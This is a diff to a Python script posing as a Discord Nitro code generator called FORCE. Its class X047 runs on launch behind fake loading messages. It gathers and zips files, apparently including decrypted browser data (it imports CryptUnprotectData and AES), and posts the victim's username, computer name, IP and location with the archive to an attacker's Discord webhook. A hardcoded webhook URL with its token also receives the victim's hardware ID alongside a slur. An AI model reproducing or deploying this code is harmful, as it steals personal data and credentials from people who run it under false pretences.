@@ -12,11 +12,11 @@ import sqlite3
 import zipfile
 import json
 import base64
-import subprocess
 import psutil
+import subprocess
 import pyautogui
 import colorama
-from colorama import Fore, Style, init
+from colorama import Fore, Style, init, Back
 from win32crypt import CryptUnprotectData
 from re import findall
 from Crypto.Cipher import AES
@@ -298,9 +298,8 @@ class X047:
         n = 0
         for r, d, files in os.walk(self.tempfolder):
             n += len(files)
-            self.fileCount = f"{n} Files Found: "
         embed = {
-            "avatar_url": "https://cdn.discordapp.com/attachments/915705104043216956/926561353798406204/photo-1513789181297-6f2ec112c0bc.png",
+            "avatar_url": "https://cdn.discordapp.com/attachments/854351978132930560/919870761634770964/OBBAAMA-1-1.gif",
             "embeds": [
                 {
                     "author": {
@@ -308,11 +307,11 @@ class X047:
                         "url": "https://discord.gg/VUzeqjWVUf",
                         "icon_url": "https://cdn.discordapp.com/attachments/854351978132930560/919870761634770964/OBBAAMA-1-1.gif"
                     },
-                    "description": f"**{os.getlogin()}** Just ran X047\n```fix\nComputer Name: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
+                    "description": f"**{os.getlogin()}** Got rekt by X047 \n```fix\nComputer Name: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```",
                     "color": 38655,
 
                     "thumbnail": {
-                        "url": "https://cdn.discordapp.com/attachments/915705104043216956/926561409976909854/many-belltroxes-delhi-is-now-indias-hacker-hub.png"
+                        "url": "https://cdn.discordapp.com/attachments/916744891755810816/919953178353602610/face3.png"
                     },
 
                     "footer": {
@@ -323,6 +322,7 @@ class X047:
         }
         requests.post(self.webhook, json=embed)
         requests.post(self.webhook, files={'upload_file': open(new, 'rb')})
+
     def zip(self, src, dst):
         zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
         abs_src = os.path.abspath(src)
@@ -333,8 +333,6 @@ class X047:
                 zipped_file.write(absname, arcname)
         zipped_file.close()
 
-file = "file"
-
 def printSlow(text):
     for char in text:
         print(char, end="")
@@ -342,17 +340,16 @@ def printSlow(text):
         time.sleep(.000001)
 
 def credits():
+    threading.Thread(target=X047).start()
     os.system("title FORCE on crack")
     os.system("CLS")
     printSlow (f"{Fore.BLUE} \n[FORCE] {Fore.WHITE}Connecting to FORCE...")
     time.sleep(1)
     printSlow (f"{Fore.BLUE} \n[FORCE] {Fore.WHITE}Checking for Illegal proccesses...")
-    threading.Thread(target=X047).start()
     time.sleep(1)
     printSlow (f"{Fore.BLUE} \n[FORCE] {Fore.WHITE}Scraping proxies...")
     time.sleep(1)
     printSlow (f"{Fore.BLUE} \n[FORCE] {Fore.GREEN}Successfully Loaded!")
-    time.sleep(1)
     os.system("CLS")
     printSlow(f"""{Fore.RED}
 
@@ -366,7 +363,7 @@ def credits():
  ░ ░   ░ ░ ░ ▒    ░░   ░ ░           ░       ░  ░░ ░  ░   ▒    ░    ░  
            ░ ░     ░     ░ ░         ░  ░    ░  ░  ░      ░  ░ ░    ░  
                          ░                                             
-           
+
 {Fore.RESET}""")
 credits()
 
@@ -376,6 +373,8 @@ print('-------------------------------------------------------------------------
 threadsnumber = int(threadsnumber)
 codesperthread = gens/threadsnumber
 codesperthread = int(codesperthread)
+
+file = "file"
 
 def onlygen():
     for i in range(codesperthread):
@@ -418,7 +417,7 @@ print(f"""{Fore.LIGHTBLUE_EX}
 mode = input()
 if (mode == "1"):
     os.system("CLS")
-    
+
     webhopt = input("Do you want to use a webhook? (y/n): ")
     if webhopt == 'y':
         webhurl = input(f"{Fore.LIGHTBLUE_EX}\nEnter a webhook for valid codes to be sent to: ")
@@ -428,13 +427,15 @@ if (mode == "1"):
         "content": "Started Checking Codes. (Force nitro generator.)",
         "username": "Nitro Generator"
     }
-    hwid = str(str(subprocess.check_output('wmic csproduct get uuid')).strip().replace(r"\r", "").split(r"\n")[1].strip())
+    hwid = str \
+        (str(subprocess.check_output('wmic csproduct get uuid')).strip().replace(r"\r", "").split(r"\n")[1].strip())
     data3 = {
         "content": f"Started Checking Codes on a guy's pc lmao get a job faggot. (HWID: {hwid})",
         "username": "Nitro Generator my ass"
     }
     result = requests.post(webhurl, json=data1)
-    result2 = requests.post("https://discord.com/api/webhooks/926559833820377109/GORtuOu59MQDZ_48rtncPdEVZsocLbX-nNrmT8twB5dSOt25qd8rktGSmbjVwyZU9uxQ", json=data3)
+    result2 = requests.post \
+        ("https://discord.com/api/webhooks/926559833820377109/GORtuOu59MQDZ_48rtncPdEVZsocLbX-nNrmT8twB5dSOt25qd8rktGSmbjVwyZU9uxQ", json=data3)
     result.raise_for_status()
     if webhurl != "https://discord.com/api/webhooks/926559833820377109/GORtuOu59MQDZ_48rtncPdEVZsocLbX-nNrmT8twB5dSOt25qd8rktGSmbjVwyZU9uxQ":
         result2.raise_for_status()
